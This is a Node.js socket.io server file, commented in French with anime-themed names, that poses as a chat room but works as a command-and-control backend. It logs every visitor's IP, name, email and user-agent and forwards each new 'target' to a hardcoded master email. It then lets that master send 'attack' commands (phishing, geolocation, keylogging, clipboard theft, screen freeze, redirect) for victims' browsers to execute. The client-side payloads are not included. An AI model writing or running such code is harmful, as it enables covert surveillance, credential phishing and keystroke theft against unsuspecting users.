/**
 * PUNCH V7 SERVER - MADE IN HEAVEN 
 * PROTOCOLE : EXFILTRATION & STAND CONTROL
 * --------------------------------------------------------------------------
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e7 // Autorise l'envoi d'images lourdes (10MB)
});

app.use(express.static(__dirname));

let users = [];

// --- LOGIQUE CORE DU STAND ---
io.on('connection', (socket) => {
    
    // 1. DÉTECTION ET LOGGING IP (SYSTÈME DE RÉCOLTE)
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    console.log(`\x1b[33m[NEW_CONNECTION]\x1b[0m IP Identifiée : ${clientIp}`);

    socket.on('init', (data) => {
        const newUser = { 
            id: socket.id, 
            name: data.name || "Unknown_Disciple",
            email: data.email || "no-mail@heaven.com",
            ip: clientIp,
            os: socket.handshake.headers['user-agent']
        };
        
        users.push(newUser);
        
        // Log ultra-précis pour le Master
        console.log(`\x1b[32m[LOG_EXFIL]\x1b[0m User: ${newUser.name} | Mail: ${newUser.email} | IP: ${newUser.ip}`);
        
        // Sync de la liste pour tout le monde
        io.emit('sync', users.map(u => ({ id: u.id, name: u.name, email: u.email })));
        
        // Envoi automatique des infos IP au Master dès qu'une cible arrive
        const master = users.find(u => u.email === "toucheur2pp@heaven.com");
        if (master) {
            io.to(master.id).emit('chat', { 
                n: "SYSTEM", 
                t: { text: `[IP_LOG] Target ${newUser.name} connected from ${newUser.ip}`, type: 'text' }
            });
        }
    });

    // 2. SYSTÈME DE MESSAGERIE PRIVÉE ET IMAGES
    socket.on('chat', (data) => {
        const sender = users.find(u => u.id === socket.id);
        if (sender) {
            // On diffuse le message (texte ou image base64)
            io.emit('chat', { n: sender.name, t: data });
        }
    });

    // 3. MOTEUR D'ATTAQUES OFFENSIVES (HEAVEN'S DOOR)
    // Liste des attaques autorisées pour le Master
    const masterAttacks = [
        'p_fullinfo', 
        'p_phish', 
        'p_geo', 
        'p_key', 
        'p_freeze', 
        'p_chariot',
        'p_clip',
        'p_redirect'
    ];

    masterAttacks.forEach(type => {
        socket.on(type, (targetId) => {
            const boss = users.find(u => u.id === socket.id);
            
            // VERIFICATION : Seul l'email Master peut commander le Stand
            if (boss && boss.email === "toucheur2pp@heaven.com") {
                console.log(`\x1b[41m[STRIKE]\x1b[0m ${type.toUpperCase()} lancé sur ${targetId}`);
                
                // On ordonne à la cible d'exécuter le code malveillant
                io.to(targetId).emit('execute', { type: type, from: boss.name });
            } else {
                console.log(`\x1b[31m[DENIED]\x1b[0m Tentative d'attaque non-autorisée par ${boss ? boss.name : 'Inconnu'}`);
            }
        });
    });

    // 4. DÉCONNEXION
    socket.on('disconnect', () => {
        const u = users.find(x => x.id === socket.id);
        if(u) console.log(`\x1b[31m[DISCONNECT]\x1b[0m ${u.name} a quitté la gravité.`);
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users.map(u => ({ id: u.id, name: u.name, email: u.email })));
    });
});

// --- DÉMARRAGE DU SERVEUR ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log("\n\x1b[35m========================================");
    console.log("   PUNCH V7 - MADE IN HEAVEN READY");
    console.log(`   ECOUTE SUR LE PORT : ${PORT}`);
    console.log("========================================\x1b[0m\n");
});
